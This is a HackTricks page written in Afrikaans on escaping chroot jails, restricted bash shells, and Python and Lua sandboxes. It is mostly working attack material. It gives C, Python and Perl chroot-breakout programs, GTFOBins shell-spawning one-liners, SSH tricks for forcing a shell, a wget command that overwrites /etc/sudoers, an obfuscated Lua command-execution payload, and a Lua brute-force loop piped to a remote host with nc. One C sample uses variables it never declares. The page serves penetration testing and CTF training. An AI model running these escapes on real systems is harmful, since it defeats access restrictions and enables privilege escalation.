# Ontsnap uit Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Soek in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **as jy enige binary kan uitvoer met "Shell" eienskap**

## Chroot Escapes

Van [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Die chroot-meganisme is **nie bedoel om te verdedig** teen opsetlike manipulasie deur **geprivilegieerde** (**root**) **gebruikers**. Op die meeste stelsels stapel chroot-kontekste nie reg nie en chrooted programme **met voldoende regte kan 'n tweede chroot uitvoer om uit te breek**.\
Gewoonlik beteken dit dat jy om te ontsnap root binne die chroot moet wees.

> [!TIP]
> Die **tool** [**chw00t**](https://github.com/earthquake/chw00t) is geskep om die volgende escenario's te misbruik en uit `chroot` te ontsnap.

### Root + CWD

> [!WARNING]
> As jy **root** binne 'n chroot is, **kan jy ontsnap** deur **nog 'n chroot** te skep. Dit is omdat 2 chroots nie saam kan bestaan nie (in Linux), so as jy 'n folder skep en dan **'n nuwe chroot** op daardie nuwe folder skep terwyl **jy buite dit** is, sal jy nou **buite die nuwe chroot** wees en daarom sal jy in die FS wees.
>
> Dit gebeur omdat chroot gewoonlik NIE jou working directory skuif na die aangeduide een nie, so jy kan 'n chroot skep maar buite dit wees.

Gewoonlik sal jy nie die `chroot` binary binne 'n chroot jail vind nie, maar jy **kan 'n binary compile, upload en execute**:
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Dit is soortgelyk aan die vorige geval, maar in hierdie geval **stoor die aanvaller 'n lêerdeskriptor na die huidige gids** en **skep dan die chroot in 'n nuwe vouer**. Laastens, aangesien hy **toegang** het tot daardie **FD** **buite** die chroot, verkry hy toegang daartoe en **ontsnap**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD kan oor Unix Domain Sockets oorgedra word, so:
>
> - Skep 'n child process (fork)
> - Skep UDS sodat parent en child kan praat
> - Run chroot in child process in 'n ander gids
> - In parent proc, skep 'n FD van 'n gids wat buite die nuwe child proc chroot is
> - Gee daardie FD aan die child procc met behulp van die UDS
> - Child process chdir na daardie FD, en omdat dit buite sy chroot is, sal hy die jail ontsnap

### Root + Mount

> [!WARNING]
>
> - Mounting root device (/) in 'n gids binne die chroot
> - Chrooting in daardie gids
>
> Dit is moontlik in Linux

### Root + /proc

> [!WARNING]
>
> - Mount procfs in 'n gids binne die chroot (as dit nog nie is nie)
> - Soek vir 'n pid wat 'n ander root/cwd entry het, soos: /proc/1/root
> - Chroot in daardie entry

### Root(?) + Fork

> [!WARNING]
>
> - Skep 'n Fork (child proc) en chroot in 'n ander gids dieper in die FS en CD daarop
> - Van die parent process, skuif die gids waar die child process is na 'n gids voor die chroot van die children
> - Hierdie children process sal homself buite die chroot vind

### ptrace

> [!WARNING]
>
> - 'n Ruk gelede kon users hul eie processes vanaf 'n process van hulself debug... maar dit is nie meer by default moontlik nie
> - In elk geval, as dit moontlik is, kon jy ptrace in 'n process en 'n shellcode binne-in dit execute ([sien hierdie voorbeeld](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Kry info oor die jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Wysig PATH

Kyk of jy die PATH env veranderlike kan wysig
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Gebruik vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers en help viewers

Baie beperkte omgewings laat steeds **pagers** of **help viewers** beskikbaar. Dit is gewoonlik vinniger om dit te misbruik as om te probeer om `PATH` weer op te bou.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
As `git` beskikbaar is, onthou dat sy hulp-uitset gewoonlik deur ’n pager gaan:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Algemene GTFOBins one-liners

Sodra jy weet watter binaries bereikbaar is, toets eers die voor-die-hand-liggende shell spawners:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
As jy slegs **arguments kan injecteer** in ’n toegelate command (in plaas daarvan om dit vrylik uit te voer), kyk ook **GTFOArgs**.

### Skep script

Kyk of jy ’n uitvoerbare file kan skep met _/bin/bash_ as content
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Kry bash vanaf SSH

As jy via ssh toegang verkry, kan jy dikwels die bediener vra om ’n **ander program** uit te voer in plaas van die beperkte login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
As `ssh` een van die paar plaaslik toegelate binaries is, onthou dat dit ook as ’n **GTFOBin** misbruik kan word:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Verklaar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Jy kan byvoorbeeld die sudoers file oorskryf
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Sommige omgewings laat jou nie in gewone `rbash` val nie, maar in **wrappers** soos `git-shell`, `rssh`, of `lshell`:

- `git-shell` aanvaar net server-side Git commands plus enigiets wat binne `~/git-shell-commands/` bestaan. As daardie directory bestaan, run `help` om die toegelate custom actions te lys. As jy daarheen kan **write**, word enige executable wat in daardie directory gedrop word, bereikbaar.
- `rssh` / `lshell` laat gewoonlik net `scp`, `sftp`, `rsync`, of Git-style operations toe. In daardie gevalle fokus eers op **file write primitives**: upload `authorized_keys`, 'n shell startup file, of 'n helper script na 'n writable location en reconnect dan met `ssh -t ...`.
- As die wrapper net die command line filter, enumerate die bereikbare binaries en pivot dan terug na **GTFOBins / GTFOArgs**.

### Other tricks

Kontroleer ook:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Dit kan ook interessant wees die page:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks about escaping from python jails in die volgende page:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In hierdie page kan jy die global functions vind waartoe jy toegang het binne lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Sommige truuks om **funksies van ’n library te roep sonder om dots te gebruik**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Lys funksies van ’n library op:
```bash
for k,v in pairs(string) do print(k,v) end
```
Let daarop dat elke keer wat jy die vorige eenlyner in 'n **verskillende lua-omgewing** uitvoer, die volgorde van die funksies verander. Daarom, as jy een spesifieke funksie moet uitvoer, kan jy 'n brute force-aanval uitvoer deur verskillende lua-omgewings te laai en die eerste funksie van die le biblioteek te roep:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Kry interaktiewe lua shell**: As jy binne 'n beperkte lua shell is, kan jy 'n nuwe lua shell kry (en hopelik onbeperk) deur te roep:
```bash
debug.debug()
```
## Verwysings

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
